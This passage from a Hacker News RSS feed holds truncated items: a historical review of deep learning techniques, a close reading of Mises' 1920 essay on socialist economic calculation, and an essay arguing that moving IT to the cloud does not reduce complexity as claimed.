            <link>https://michael.stapelberg.ch/posts/2021-01-10-mqtt-introduction/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25715329</guid>
            <pubDate>Sun, 10 Jan 2021 15:10:35 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deep Learning's Most Important Ideas – A Brief Historical Review]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25715318">thread link</a>) | @coolvision
<br/>
January 10, 2021 | https://dennybritz.com/blog/deep-learning-most-important-ideas/ | <a href="https://web.archive.org/web/*/https://dennybritz.com/blog/deep-learning-most-important-ideas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The goal of this post is to review well-adopted ideas that have stood the test of time. I will present a small set of techniques that cover a lot of basic knowledge necessary to understand modern Deep Learning research. If you're new to the field, these are a great starting point.</p><div id="post-content"><p>Deep Learning is an extremely fast-moving field and the huge number of research papers and ideas can be overwhelming. Even seasoned researchers have a hard time telling company PR from real breakthroughs. The goal of this post is to review those ideas that have <strong>stood the test of time</strong>, which is perhaps the only significance test one should rely on. These ideas, or improvements of them, have been used over and over again. They're known to work.</p> <p>If you were to start in Deep Learning today, understanding and implementing each of these techniques would give you an excellent foundation for understanding recent research and working on your own projects. It's what I believe the best way to get started. Working through papers in historical order is also a useful exercise to understand where the current techniques come from and why they were invented in the first place. <strong><strong>Put another way, I will try to present a <em>minimal set</em> of ideas that most of the basic knowledge necessary to understand modern Deep Learning research.</strong></strong></p> <p>A rather unique thing about Deep Learning is that its application domains (Vision, Natural Language, Speech, RL, etc) share the majority of techniques. For example, someone who has worked in Deep Learning for Computer Vision his whole career could quickly be productive in NLP research. The specific network architectures may differ, but the concepts, approaches and code are mostly the same. I will try to present ideas from various fields, but there are a few caveats about this list:</p> <ul> <li>My goal is not to give in-depth explanations or code examples for these techniques. It's not easily possible to summarize long complex papers into a single paragraph. Instead, I will give a brief overview of each technique, its historical context, and links to papers and implementations. If you want to learn something, I <em>highly recommend</em> trying to re-produce some of these paper results from scratch in raw <a href="https://pytorch.org/">PyTorch</a> without using existing code bases or high-level libraries.</li> <li>The list is biased towards my own knowledge and the fields I am familiar with. There are many exciting subfields that I don't have experience with. I will stick to what most people would consider the popular mainstream domains of Vision, Natural Language, Speech, and Reinforcement Learning / Games.</li> <li>I will only discuss research that has official or semi-official open source implementations that are known to work well. Some research isn't easily reproducible because it involves huge engineering challenges, for example <a href="https://deepmind.com/research/case-studies/alphago-the-story-so-far">DeepMind's AlphaGo</a> or <a href="https://openai.com/projects/five/">OpenAI's Dota 2 AI</a>, so I won't highlight it here.</li> <li>Some choices are arbitrary. Often, rather similar techniques are published at around the same time. The goal of this post is not be a comprehensive review, but to to expose someone new to the field to a cross-section of ideas that cover a lot of ground. For example, there may be hundreds of GAN variations, but to understand the general concept of GANs, it really doesn't matter which one you study.</li> </ul>  <p><strong><strong>Papers</strong></strong></p> <ul> <li><a href="https://papers.nips.cc/paper/4824-imagenet-classification-with-deep-convolutional-neural-networks">ImageNet Classification with Deep Convolutional Neural Networks (2012)</a> <span data-cites="krizhevsky_imagenet_2012">Krizhevsky, Sutskever, and Hinton (2012)</span></li> <li><a href="https://arxiv.org/abs/1207.0580">Improving neural networks by preventing co-adaptation of feature detectors (2012)</a> <span data-cites="hinton_improving_2012">Hinton et al. (2012)</span></li> <li><a href="https://arxiv.org/abs/1404.5997">One weird trick for parallelizing convolutional neural networks (2014)</a> <span data-cites="krizhevsky_one_2014">Krizhevsky (2014)</span></li> </ul> <p><strong><strong>Implementations</strong></strong></p> <ul> <li><a href="https://pytorch.org/hub/pytorch_vision_alexnet">AlexNet in PyTorch</a></li> <li><a href="https://github.com/tensorflow/models/blob/master/research/slim/nets/alexnet.py">AlexNet in TensorFlow</a></li> </ul> <figure> <img src="https://dennybritz.com/assets/deep-learning-most-important-ideas/alexnet-full.png" alt=""><figcaption>Source: <a href="https://papers.nips.cc/paper/4824-imagenet-classification-with-deep-convolutional-neural-networks">https://papers.nips.cc/paper/4824-imagenet-classification-with-deep-convolutional-neural-networks</a></figcaption> </figure> <p>AlexNet is often considered the algorithm responsible for the recent boom in Deep Learning and Artificial Intelligence research. It is a Deep Convolutional Neural Network based on the earlier LeNet developed by Yann LeCun. AlexNet beat previous methods at classifying images from the <a href="http://image-net.org/index">ImageNet dataset</a> by a significant margin through a combination of GPU power and algorithmic advances. It demonstrated that neural networks actually work! AlexNet was also one of the first times Dropout <span data-cites="hinton_improving_2012">Hinton et al. (2012)</span> was used, which has since become a crucial component for improving the generalization ability of all kinds of Deep Learning models.</p> <p>The architecture used by AlexNet, a sequence of Convolutional layers, ReLU nonlinearity, and max-pooling, became the accepted standard that future Computer Vision architectures would extend and built upon. These days, software libraries such as PyTorch are so powerful, and compared to more recent architectures AlexNet is so simple, that it can be implemented in only a few lines of code. Note that many implementations of AlexNet, such as those linked above, use the slight variation of the network described in <a href="https://arxiv.org/abs/1404.5997">One weird trick for parallelizing convolutional neural networks</a> <span data-cites="krizhevsky_one_2014">Krizhevsky (2014)</span>.</p>  <p><strong><strong>Papers</strong></strong></p> <ul> <li><a href="https://arxiv.org/abs/1312.5602">Playing Atari with Deep Reinforcement Learning (2013)</a> <span data-cites="mnih_playing_2013">Mnih et al. (2013)</span></li> </ul> <p><strong><strong>Implementations</strong></strong></p> <ul> <li><a href="https://pytorch.org/tutorials/intermediate/reinforcement_q_learning.html">DQN in PyTorch</a></li> <li><a href="https://www.tensorflow.org/agents/tutorials/1_dqn_tutorial">DQN in TensorFlow</a></li> </ul> <figure> <img src="https://dennybritz.com/assets/deep-learning-most-important-ideas/deep-q-learning-value.png" alt=""><figcaption>Source: <a href="https://deepmind.com/research/publications/human-level-control-through-deep-reinforcement-learning">https://deepmind.com/research/publications/human-level-control-through-deep-reinforcement-learning</a></figcaption> </figure> <p>Building on top of the recent breakthroughs in image recognition and GPUs, a team at DeepMind managed to train a network to <a href="https://www.youtube.com/watch?v=V1eYniJ0Rnk">play Atari Games</a> from raw pixel inputs. What's more, the <em>same</em> neural network architecture learned to play seven different games without being told any game-specific rules, demonstrating the generality of the approach.</p> <p>Reinforcement Learning differs from Supervised Learning, such as image classification, in that an agent must learn maximize to the sum of rewards over multiple time steps, such as winning a game, instead of just predicting a label. Because the agent interacts directly with the environment and each action affects the next, the training data is not independent and identically distributed (iid), which makes the training of many Machine Learning models quite unstable. This was solved by using techniques such as experience replay <span data-cites="lin_self-improving_1992">Lin (1992)</span>.</p> <p>While there was no obvious algorithmic innovation that made this work, the research cleverly combined existing techniques, convolutional neural networks trained on GPUs and experience replay, with a few data processing tricks to achieve impressive results that most people would not have expected. This gave people confidence in extending Deep Reinforcement Learning techniques to tackle even more complex tasks such as <a href="https://deepmind.com/research/case-studies/alphago-the-story-so-far">Go</a>, <a href="https://openai.com/projects/five/">Dota 2</a>, <a href="https://deepmind.com/blog/article/alphastar-mastering-real-time-strategy-game-starcraft-ii">Starcraft 2</a>, and others.</p> <p>Atari Games <span data-cites="bellemare_arcade_2013">Bellemare et al. (2013)</span> have since become a standard benchmark in Reinforcement Learning research. The initial approach only solved (beat human baselines on) seven games, but over the coming years advances built on top of these ideas would start beating humans on an ever increasing number of games. One particular game, Montezuma’s Revenge, was famous for requiring long-term planning and was considered to be among the most difficult to solve. It was only recently <span data-cites="badia_agent57_2020">Badia et al. (2020)</span> <span data-cites="ecoffet_first_2020">Ecoffet et al. (2020)</span> that techniques managed to beat human baselines on all 57 games.</p>  <p><strong><strong>Papers</strong></strong></p> <ul> <li><a href="https://arxiv.org/abs/1409.3215">Sequence to Sequence Learning with Neural Networks</a> <span data-cites="sutskever_sequence_2014">Sutskever, Vinyals, and Le (2014)</span></li> <li><a href="https://arxiv.org/abs/1409.0473">Neural Machine Translation by Jointly Learning to Align and Translate</a> <span data-cites="bahdanau_neural_2016">Bahdanau, Cho, and Bengio (2016)</span></li> </ul> <p><strong><strong>Implementations</strong></strong></p> <ul> <li><a href="https://pytorch.org/tutorials/intermediate/seq2seq_translation_tutorial.html#">Seq2Seq with Attention in PyTorch</a></li> <li><a href="https://www.tensorflow.org/addons/tutorials/networks_seq2seq_nmt">Seq2Seq with Attention in TensorFlow</a></li> </ul> <figure> <img src="https://dennybritz.com/assets/deep-learning-most-important-ideas/seq2seq-cn.gif" alt=""><figcaption>Source: <a href="https://ai.googleblog.com/2017/04/introducing-tf-seq2seq-open-source.html">https://ai.googleblog.com/2017/04/introducing-tf-seq2seq-open-source.html</a></figcaption> </figure> <p>Deep Learning's most impressive results had largely been on vision-related tasks and was driven by Convolutional Neural Networks. While the NLP community had success with <a href="http://karpathy.github.io/2015/05/21/rnn-effectiveness/">Language Modeling</a> and Translation using LSTM networks <span data-cites="hochreiter_long_1997">Hochreiter and Schmidhuber (1997)</span> and Encoder-Decoder architectures <span data-cites="sutskever_sequence_2014">Sutskever, Vinyals, and Le (2014)</span>, it was not until the invention of the <strong>attention</strong> mechanism <span data-cites="bahdanau_neural_2016">Bahdanau, Cho, and Bengio (2016)</span> that things started to work spectacularly well.</p> <p>When processing language, each token, which could be a character, a word, or something in between, is fed into a recurrent network, such as an LSTM, which maintains a kind of memory of previously processed inputs. In other words, a sentence is very similar to a time series with each token being a time step. These recurrent models often had difficulty dealing with dependencies over long time horizons. When they process a sequence, they would easily "forget" earlier inputs because their gradients needed to propagate through many time steps. Optimizing these models with gradient descent was hard.</p> <p>The new attention mechanism helped alleviate the problem. It gave the network an option to adaptively "look back" at earlier time steps by introducing shortcut connections. These connections allowed the network to decide which inputs are important when producing a specific output. The canonical example is translation: When producing an output word, it typically maps to one or more specific input words.</p>  <p><strong><strong>Papers</strong></strong></p> <ul> <li><a href="https://arxiv.org/abs/1412.6980">Adam: A Method for Stochastic Optimization</a> <span data-cites="kingma_adam_2017">Kingma and Ba (2017)</span></li> </ul> <p><strong><strong>Implementations</strong></strong></p> <ul> <li><a href="https://d2l.ai/chapter_optimization/adam.html">Implementing Adam in Python</a></li> <li><a href="https://pytorch.org/docs/master/_modules/torch/optim/adam.html">PyTorch Adam implementation</a></li> <li><a href="https://github.com/tensorflow/tensorflow/blob/v2.2.0/tensorflow/python/keras/optimizer_v2/adam.py#L32-L281">TensorFlow Adam implementation</a></li> </ul> <figure> <img src="https://dennybritz.com/assets/deep-learning-most-important-ideas/optimizer-benchmark.png" alt=""><figcaption>Source: <a href="http://arxiv.org/abs/1910.11758">http://arxiv.org/abs/1910.11758</a></figcaption> </figure> <p>Neural networks are trained by minimizing a loss function, such as the average classification error, using an optimizer. The optimizer is responsible for figuring out how to adjust the parameters of the network to make it learn the objective. Most optimizers are <a href="https://ruder.io/optimizing-gradient-descent/">based on variations of Stochastic Gradient Descent (SGD)</a>. However, many of these optimizers contain tunable parameters such as a learning rate themselves. Finding the right settings for a specific problem not only reduces training time, but can also lead to better results due to finding a better local minimum of the loss function.</p> <p>Big resarch labs often ran expensive hyperparameter searches that came up with complex learning rate schedules to get the best out of simple but hyperparameter-sensitive optimizers such as SGD. When they …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://dennybritz.com/blog/deep-learning-most-important-ideas/">https://dennybritz.com/blog/deep-learning-most-important-ideas/</a></em></p>]]>
            </description>
            <link>https://dennybritz.com/blog/deep-learning-most-important-ideas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25715318</guid>
            <pubDate>Sun, 10 Jan 2021 15:09:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Socialist Calculation Debate: Reckoning with Mises]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25715114">thread link</a>) | @bwestergard
<br/>
January 10, 2021 | http://socialistplanning.org/posts/reckoning-with-mises | <a href="https://web.archive.org/web/*/http://socialistplanning.org/posts/reckoning-with-mises">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
<header>


</header>
<p>Have you heard of the “<a href="https://en.wikipedia.org/wiki/Socialist_calculation_debate">socialist calculation debate</a>”? There are many brief essays intended to introduce a general audience to it, often expressly written to vindicate the doctrines of one political tendency or another. If you read a few of these, you will quickly notice they tend to repeat one of three stories about the debate:</p>
<ol type="1">
<li><p>Austrian economists like <a href="https://en.wikipedia.org/wiki/Ludwig_von_Mises">Mises</a> and <a href="https://en.wikipedia.org/wiki/Friedrich_Hayek">Hayek</a> foresaw the problems a socialist society would encounter. In a few short years, the Soviet Union and its imitators in fact encountered precisely these problems. Despite this confirmation of the essentially validity of the Austrian perspective, many today persist in pursuing socialism (or policies tantamount to socialism) out of ignorance<a href="#fn1" id="fnref1"><sup>1</sup></a>.</p></li>
<li><p>Late nineteenth and early twentieth century Marxist theorists had an interesting critiques of capitalist society, but no institutional blueprint to guide socialist construction. Austrian economists came along and pointed out this embarassing absence, at which point it fell to economists of a neoclassical bent and progressive sympathies (like <a href="https://en.wikipedia.org/wiki/Oskar_R._Lange">Lange</a>, <a href="https://en.wikipedia.org/wiki/Abba_P._Lerner">Lerner</a>, and <a href="https://en.wikipedia.org/wiki/Fred_M._Taylor">Taylor</a>) to fill the gap. They showed, in varying ways, that the conceptual resources of neoclassical economics are not only useful for analyzing any society regardless of its political character, property relations, etc. but can be drawn upon to devise planning institutions for socialism. Socialism was and remains entirely possible in principle. Economists cannot claim any special authority in evaluating its desirability.<a href="#fn2" id="fnref2"><sup>2</sup></a></p></li>
<li><p>Austrian economists argued that only capitalist institutions could support rational economic decision making through the price mechanism. Neoclassical economists (e.g.&nbsp;Lange, Lerner, Taylor) showed that this was not the case, and that with the right kind of institutional design, prices could be discovered that were at least as good, if not better, than those arising in contemporary capitalism. Austrians rightly pointed out that such planning bodies would have to gather and process immense amounts of information, which was a practical impossibility in the twenties and thirties. But thanks to twenty-first century information technologies, socialism has become a practical possibility.<a href="#fn3" id="fnref3"><sup>3</sup></a></p></li>
</ol>
<p>These stories about the debate substantially contradict one another, and cannot all be accurate. At best they neglect interesting arguments<a href="#fn4" id="fnref4"><sup>4</sup></a>.</p>
<p>Rather than immediately add my own “take” to the pile, I’d like to use this series of blog posts to do a close reading of the primary texts of the debate<a href="#fn5" id="fnref5"><sup>5</sup></a> in the order they were published.</p>
<p>The obvious place to start is Ludwig von Mises’ 1920 essay, <em>Die Wirtschaftsrechnung im sozialistischen Gemeinwesen</em><span data-cites="Mises_1920"><a href="#fn6" id="fnref6"><sup>6</sup></a></span>, which is agreed by all commentators to be the start of the debate as it we know it today.</p>
<p>The title is generally translated as “Economic Calculation in the Socialist Commonwealth”, but “Wirtschaftsrechnung” might just as well be translated as “economic reckoning”. This is supported by the shared etymology of “rechnung” and “reckon”, but I also prefer it because “reckoning”, unlike “calculation”, seems more inclusive of the humdrum, ad hoc, non-expert, a relatively atheoretical kinds of quantitative reasoning that Mises often seems to have in mind (e.g.&nbsp;the “reckoning” of a farmer deciding whether to replace a tractor).</p>
<p>In this post, I’ll summarize the essay and provide a bit of context. I’ll refrain from discussing anticipations of Mises’ arguments by other writers, his later work, or critical responses. I hope to discuss each of these topics in future posts.</p>
<h2 id="historical-context">Historical context</h2>
<p>First, a note on the context in which Mises wrote.</p>
<p>A little over a century ago, the first world war triggered a working class rebellion. For decades, socialist, communist, and anarchist workers across globe had been organizing to free themselves from the domination of the owning classes and their political representatives. It appeared they might be on the cusp of doing so in Germany and Russia.</p>
<p>A minority among these militants called for the immediate expropriation of the fields, factories, and workshops by democratically elected councils of workers, soldiers, and sailors. It appeared for a fleeting moment that this tendency would achieve a breakthrough in Germany, as many had predicted. But those hopes fizzled as the <a href="https://en.wikipedia.org/wiki/German_Revolution_of_1918%E2%80%931919">German uprisings were suppressed and the ill-fated Weimar Republic was founded</a> with the backing of socialists committed to a more gradual path away from capitalism.</p>
<p>Instead, the breakthrough came under Bolshevik leadership in Russia in October of 1917. Contrary to all expectations, the Bolsheviks prevailed in the ruinous civil war that followed and went on to found the Union of Soviet Socialist Republics in 1921. “soviet” being the Russian term for “[worker] council”, this was the first state nominally committed to the principle that the mass of working people could not only democratically govern their places of work, but the entire “economic” apparatus of their society. Many politically conscious workers and professional intellectuals the world over viewed the Soviet experiment sympathetically, as an extension of their own political projects<span data-cites="Foner_1967"><a href="#fn7" id="fnref7"><sup>7</sup></a></span>. Mises felt socialism was on the rise<span data-cites="Mises_1920"><a href="#fn8" id="fnref8"><sup>8</sup></a></span>:</p>
<blockquote>
<p>In an age in which we are getting nearer and nearer to socialism, and even in a certain sense are already there, research into the problems of the socialist economy acquires added importance for explaining what is going on around us. Analyses of the exchange economy no longer suffice for understanding economic developments in Germany and its eastern neighbors today. Our task here is to discuss elements of a socialist commonwealth with a considerably wide scope. Under these circumstances, an attempt to explain the nature of socialist society needs no special justification.</p>
</blockquote>
<h2 id="mises-intervention">Mises’ intervention</h2>
<p>In 1920, it was not hard to find journalists, politicians, and religious leaders who were decrying Bolshevik efforts to abolish private property in the means of production as profoundly unjust.</p>
<p>For Mises, to leave the argument there was to miss a more fundamental issue. In his view, the radical workers’ program wasn’t <em>just</em> ethically objectionable and fraught with practical difficulties. It was incoherent, a wish born of deep confusion about how capitalist societies managed to deliver the goods. To abolish private property was to the undermine the institutional prerequisites for rational coordination of industrial production and stewardship of natural resources. The pursuit of socialism was likely to lead to the decline of rational thought as such<a href="#fn9" id="fnref9"><sup>9</sup></a>:</p>
<blockquote>
<p>There would be no means of determining what is rational, and hence production could never deliberately be focused on economic efficiency. The impact of this is clear, even beyond the implications for the provision of goods to men: the purpose of the market would be driven out of the very ground that is its proper domain. Would there be any such thing as a rational market at all, or indeed would thought be rational and logical? Historically, human reason developed out of economic life. Could it then hold on at all when driven away of this?</p>
</blockquote>
<h2 id="die-wirtschaftsrechnung-summarized"><em>Die Wirtschaftsrechnung…</em> summarized</h2>
<p>This gist of Mises’ essay is as follows<a href="#fn10" id="fnref10"><sup>10</sup></a>.</p>
<p>In capitalist societies, those who wish to make money by producing goods or services can only acquire the specific means of production they require to do so (e.g.&nbsp;land, buildings, raw materials, machinery) by offering their current owners more than rivals<a href="#fn11" id="fnref11"><sup>11</sup></a> who have alternative money-making plans for them.</p>
<p>By competing with one another for access to the means of production, and for market-share among consumers (who may themselves be businesses), the principals of private enterprises or their agents are constantly altering prevailing prices. They do so on the basis of their reckoning of productive possibilities (e.g. “maybe we could make the body of a mid-sized car out of injection-molded plastic”), specifics of time and place (e.g. “the market is glutted with moulding machines right now due to the failure of a few firms that used them”), and consumer preferences (e.g. “over the next decade, tens of millions of Americans will buy a mid-sized car and just want something cheap that won’t rust”).</p>
<p>On the basis of these reckonings they make decisions about which means of production to purchase and how to make use of them to turn a profit. Put another way, they are continuously formulating and revising business plans. These plans invariably conflict, in the sense that for some to be realized others must not be; it would be quite surprising if the annual sales targets of all auto manufacturers taken together summed to exactly the number sold in the year in question. The clash of plans in producer and consumer good markets continuously selects for profitable enterpises and tends to produce more or less stable prices for most important means of production (so-called “higher order” goods). These prices are both a product of, and influence upon, uncountable myraids of producer evaluations. They are an <em>indispensible precondition</em> for rational economic decision making.</p>
<p>Mises argues that in a socialist society in which private property has been abolished, the rivalrous clash of producer plans would necessarily cease, and thus prices <em>as we know them</em> would not be available to those organizing particular production processes. Without prices for production goods, those organizing these processes (e.g.&nbsp;making cars) could formulate plenty of technically feasible plans so long as they were assured access to the necessary inputs. But the number of such plans would be overwhelming.</p>
<p>When all production goods have a price in some common unit, anticipated marginal costs can be summed and compared with anticipated marginal revenues. If costs exceed revenues, the plan can be rejected immediately (“sure, we can make the body of the car out of titanium and be sure it won’t rust, but it would triple the cost of the car and the number of buyers would plummet to basically zilch!”). Reckonings in terms of monetary cost do not uniquely …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://socialistplanning.org/posts/reckoning-with-mises">http://socialistplanning.org/posts/reckoning-with-mises</a></em></p>]]>
            </description>
            <link>http://socialistplanning.org/posts/reckoning-with-mises</link>
            <guid isPermaLink="false">hacker-news-small-sites-25715114</guid>
            <pubDate>Sun, 10 Jan 2021 14:53:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The many lies about reducing complexity part 2: Cloud]]>
            </title>
            <description>
<![CDATA[
Score 215 | Comments 115 (<a href="https://news.ycombinator.com/item?id=25714822">thread link</a>) | @rapnie
<br/>
January 10, 2021 | https://ea.rna.nl/2021/01/10/the-many-lies-about-reducing-complexity-part-2-cloud/ | <a href="https://web.archive.org/web/*/https://ea.rna.nl/2021/01/10/the-many-lies-about-reducing-complexity-part-2-cloud/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>The world has been getting a lot more complex, most people will agree to that. A major element in that rising complexity has been the <a href="https://ea.rna.nl/2020/02/11/a-tipping-point-in-the-information-revolution/">insanely huge amounts of machine logic we human species have been adding to the world</a>. Both that logic itself, as what it enables — think globalisation of trade and communication — has made most of our lives more complex and complicated in one way or another. And while it has brought us much, it also has a serious <a href="https://ea.rna.nl/2020/03/04/gossip-trust-and-the-information-revolution/">number of unwanted side-effects</a>.</p>



<p>We run into the boundaries of our ability to handle that complexity on a daily basis. Be it the large IT projects that invariably run late, cost too much, maybe even straight out fail. Or how we must try to stay secure in a digital world full of brittleness of logic and the weaknesses of humans.</p>



<p>[Note 1: This article is meant to be understandable (with a bit of effort) by non-specialists. There is quite a bit of jargon in it, but I try my best to explain all of it, including a table below with extensive explanation of a number of key terms. If I don’t explain a term, it is safe to ignore it if you don’t know what it is (e.g. when I mention a ‘tomcat server’ as an example), it is helpful for those that know, but not really necessary to know what it is to follow the story]</p>



<p>So, it isn’t a surprise that in IT, a constant drive over the last decennia has been the drive to reduce complexity. <em>‘Reducing complexity’ sells.</em> Especially managers in IT are sensitive to it as complexity generally is their biggest headache. Hence, in IT, people are in a perennial fight to make the complexity bearable. One method that has been popular for decennia has been standardisation and rationalisation of the digital tools we use, a basic “let’s minimise the number of applications we use”. This was actually part 1 of this story: <a href="https://ea.rna.nl/2016/01/10/a-tale-of-application-rationalization-not/">A tale of application rationalisation (not)</a>. That story from 2015 explains how many rationalisation efforts were partly lies. (And while we’re at it: enjoy <a rel="noreferrer noopener" href="http://dilbert.com/strip/2011-01-07" target="_blank">this Dilbert cartoon</a> that is referenced therein.) Most of the time multiple <em>applications</em> were replaced by a single <em>platform</em> (in short: a platform is software that can run other software) and the <em>applications</em> had to be ‘rewritten’ to work ‘inside’ that platform. So you ended up with one <em>extra</em> platform, the <em>same</em> number of applications and generally a few new <em>extra</em> ways of ‘programming’, specific for that platform. That doesn’t mean it is <em>all</em> lies. The new platform is generally dedicated to a certain type of application, which makes programming these applications simpler. But the situation is not as simple as the platform vendors argue. As Frederick Brooks had already told us in 1986: <a href="https://en.wikipedia.org/wiki/No_Silver_Bullet">There Is No Silver Bullet</a>.</p>



<p>Another drive has been to encapsulate (hide) complexity and access it through simpler interfaces. And a third has been to automate IT itself, creating complex ‘management IT’. All three play a role when we start to outsource IT to cloud services like Microsoft Azure or AWS.</p>



<p>[Note 2: This article has gotten out of hand. Totally. Quite long while I don’t digress a lot — as I often do. But exposing hidden complexity cannot be done by not presenting it to you. And not understanding how complex the real IT world is leads to bad outcomes. When the software for supporting the Covid-19 vaccination campaign was a few weeks(!) late because testing wasn’t done yet, I read about a leading politician state something like “Come on, a bit of testing, how hard can it be?”. That is a cringeworthy display of not understanding how complex IT is. And that is partly why I write this. Because until our leaders actually start to understand this, they will create more and more disasters out of ignorance. Back to the story.]</p>



<p>Cloud services have generally been explained (sold) to us with a graphic like this:</p>



<figure><img data-attachment-id="172827" data-permalink="https://ea.rna.nl/xaas-orthodox-1/" data-orig-file="https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-1.jpeg" data-orig-size="2519,1755" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="xaas-orthodox-1" data-image-description="" data-medium-file="https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-1.jpeg?w=300" data-large-file="https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-1.jpeg?w=720" src="https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-1.jpeg?w=1024" alt="" srcset="https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-1.jpeg?w=1024 1024w, https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-1.jpeg?w=2048 2048w, https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-1.jpeg?w=150 150w, https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-1.jpeg?w=300 300w, https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-1.jpeg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Typical depiction of what is being outsourced when you move to the cloud</figcaption></figure>



<div>
<div>
<p>For non-technical people,  here is a basic explanation of terms used in the above figure and in the text.</p>



<p><span><strong>On Premises</strong></span>: Using your own hardware<br><span><strong>Application</strong></span>: Software that you use, e.g. Microsoft Word.<br><span><strong>Data</strong></span>: The data in your program, say your text in Word.<br><strong><span>Runtime</span>:</strong> Software that is required for other software to run, e.g. basic functionality for Java programs (‘Java runtime’). (Java is a programming language.)<br><span><strong>Middleware</strong></span>: More complex software that is required for other software to run but may also have its own function. E.g. a database.<br><span><strong>Operating System</strong></span>: The lowest layer of software that sits between the machine and all other software. Like Windows or macOS at home.<br><span><strong>Virtualisation</strong></span>: A way to turn one very big real ‘machine’ (computer) into many <em>virtual machines</em> by arranging multiple operating systems to share the big machine. Sharing increases efficiency because not all operating systems are busy at the same time. It also has other advantages.<br><span><strong>Server</strong></span>: The big ‘real’ machine. Like your computer at home but much bigger with multiple processors and lots of memory so it can be shared.<br><span><strong>Storage</strong></span>: Separate machine that is optimised to provide storage (disks), can be used by multiple servers. At home people sometimes have this too in the form of a NAS. These are generally ‘appliances’, that is specialised hardware (in this case with a lot of disks) with specialised software to manage them.<br><span><strong>Networking</strong></span>: Separate machine that enables data traffic between systems. Like your modem, router and Wifi Access Point at home. Again, an appliance with specialised hardware (in this case network interfaces such as wifi antennas and sockets for network cables) that has specialised software to manage these.</p>
</div>



<div>
<p>The suggestion is this: as we move away from our own IT ‘on-premises’ (which includes whatever co-hosting data center you use, in. this context it just means you own your own IT hardware) to more and more in the cloud, we are outsourcing more and more, we are responsible for less, <em>our life simplifies</em>. More cloud is cheaper, simpler and more flexible. What is there not to like?</p>



<p>What there is not to like is that this suggestion is for a large part a lie. And a nasty one.</p>



<p>Take for instance networking. According to the graphic, as soon as you move to the cloud, it’s no longer your responsibility. But that is a lie, except for the rightmost option (SAAS — more about this later). If you set up your IAAS or PAAS in the public cloud — say Microsoft Azure — you have to manage quite a bit of networking. In fact, while Microsoft runs the underlying <em>hardware</em>, much of what has to be managed, will be managed by you. You decide on segmenting, networking, VPNs (virtual private networks — a way to protect traffic between networks), routing firewalls, etc., you’re just using Azure tooling to set it up. It’s easier, but it’s far from all gone.</p>



<p>It is best explained by using an example. Suppose you open up some of your cloud-based systems to access from the public internet? You can do that. And suppose you shouldn’t have, because these systems contain sensitive data? And suppose this data is stolen in a very public breach? Who is to blame? Microsoft for providing you with enough rope to hang yourself, or you? It is clear that if this is a big news story, the heading will not be “Microsoft was lax with its security and management”, but “Company X was lax with its security and management <em>in the cloud</em>“.</p>








</div>
</div>



<p>So, the reality of the situation is therefore more like this:</p>



<figure><img data-attachment-id="172832" data-permalink="https://ea.rna.nl/xaas-orthodox-morerealistic-5/" data-orig-file="https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-morerealistic-5.jpeg" data-orig-size="2541,1766" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="xaas-orthodox-morerealistic-5" data-image-description="" data-medium-file="https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-morerealistic-5.jpeg?w=300" data-large-file="https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-morerealistic-5.jpeg?w=720" src="https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-morerealistic-5.jpeg?w=1024" alt="" srcset="https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-morerealistic-5.jpeg?w=1024 1024w, https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-morerealistic-5.jpeg?w=2048 2048w, https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-morerealistic-5.jpeg?w=150 150w, https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-morerealistic-5.jpeg?w=300 300w, https://rnaea.files.wordpress.com/2021/01/xaas-orthodox-morerealistic-5.jpeg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>A slightly more realistic depiction of self-sourcing versus cloud outsourcing</figcaption></figure>



